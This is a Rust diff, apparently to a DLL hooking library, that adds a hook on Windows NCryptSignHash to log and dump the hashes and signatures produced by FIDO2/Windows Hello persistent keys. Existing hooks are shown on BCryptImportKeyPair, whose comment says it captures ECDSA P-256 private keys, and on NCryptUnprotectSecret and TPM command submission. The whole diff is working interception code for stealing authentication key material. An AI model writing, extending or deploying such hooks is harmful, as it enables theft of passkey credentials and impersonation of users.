@@ -96,6 +96,7 @@ static mut TRAMP_NUS: *mut u8 = std::ptr::null_mut(); // NCryptUnprotectSecret
 static mut TRAMP_TBS: *mut u8 = std::ptr::null_mut(); // Tbsip_Submit_Command
 static mut TRAMP_BIK: *mut u8 = std::ptr::null_mut(); // BCryptImportKeyPair（★ 首要）
 static mut TRAMP_BSH: *mut u8 = std::ptr::null_mut(); // BCryptSignHash（辅助关联）
+static mut TRAMP_NSH: *mut u8 = std::ptr::null_mut(); // NCryptSignHash（★ FIDO2 持久化密钥签名）
 static CAPTURE_COUNT: Mutex<u32> = Mutex::new(0);
 static INIT_PID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
 
@@ -151,6 +152,8 @@ fn init_hooks() {
         // ★ C 方案新增：BCryptImportKeyPair（首要，抓 ECDSA_P256 私钥）+ BCryptSignHash（辅助关联）
         install_one_hook("bcrypt.dll", "BCryptImportKeyPair", h_bcrypt_import_keypair as _, &mut TRAMP_BIK);
         install_one_hook("bcrypt.dll", "BCryptSignHash", h_bcrypt_sign_hash as _, &mut TRAMP_BSH);
+        // ★ NCryptSignHash：FIDO2 持久化密钥签名必经之路
+        install_one_hook("ncrypt.dll", "NCryptSignHash", h_ncrypt_sign_hash as _, &mut TRAMP_NSH);
     }
     log_cap("INFO", "hook installation finished");
 }
@@ -278,6 +281,18 @@ type BCryptSignHashFn = unsafe extern "system" fn(
     *mut u32,      // pcbResult
     u32,           // dwFlags
 ) -> i32; // NTSTATUS
+
+// NCryptSignHash — FIDO2 持久化密钥签名（Windows Hello Passport KSP）
+type NCryptSignHashFn = unsafe extern "system" fn(
+    usize,         // hKey (NCRYPT_KEY_HANDLE)
+    *const c_void, // pPaddingInfo
+    *const u8,     // pbHashValue (hash to sign)
+    u32,           // cbHashValue
+    *mut u8,       // pbSignature (OUT)
+    u32,           // cbSignature
+    *mut u32,      // pcbResult
+    u32,           // dwFlags
+) -> i32; // SECURITY_STATUS
 
 // ─── 辅助：宽字符串比较 ───────────────────────────────────────────────────
 fn wstr_eq(ptr: *const u16, expected: &str) -> bool {
@@ -482,6 +497,38 @@ extern "system" fn h_bcrypt_sign_hash(
             // hash 可用于和已知 challenge 的 SHA-256 比对以确认为 FIDO 签名
             if cb_input > 0 && cb_input <= 64 && !pb_input.is_null() {
                 dump_plaintext("BCryptSignHash_input", pb_input, cb_input as usize);
+            }
+            leave_capture();
+        }
+        r
+    }
+}
+
+// ─── NCryptSignHash hook（FIDO2 持久化密钥签名 — 签名发生在哪就在哪捕获）─
+
+extern "system" fn h_ncrypt_sign_hash(
+    h_key: usize,
+    p_padding: *const c_void,
+    pb_hash: *const u8,
+    cb_hash: u32,
+    pb_sig: *mut u8,
+    cb_sig: u32,
+    pcb_result: *mut u32,
+    dw_flags: u32,
+) -> i32 {
+    unsafe {
+        let orig: NCryptSignHashFn = std::mem::transmute(TRAMP_NSH as *const c_void);
+        let r = orig(h_key, p_padding, pb_hash, cb_hash, pb_sig, cb_sig, pcb_result, dw_flags);
+        if r == 0 && !pb_sig.is_null() && cb_sig > 0 && !pcb_result.is_null() && enter_capture() {
+            let sig_len = *pcb_result as usize;
+            log_cap("SIGN",
+                &format!("NCryptSignHash hKey=0x{h_key:X} hash={cb_hash}B sig={sig_len}B"),
+            );
+            if cb_hash > 0 && cb_hash <= 64 && !pb_hash.is_null() {
+                dump_plaintext("NCryptSignHash_input", pb_hash, cb_hash as usize);
+            }
+            if sig_len > 0 && sig_len <= 1024 && !pb_sig.is_null() {
+                dump_plaintext("NCryptSignHash_sig", pb_sig, sig_len);
             }
             leave_capture();
         }
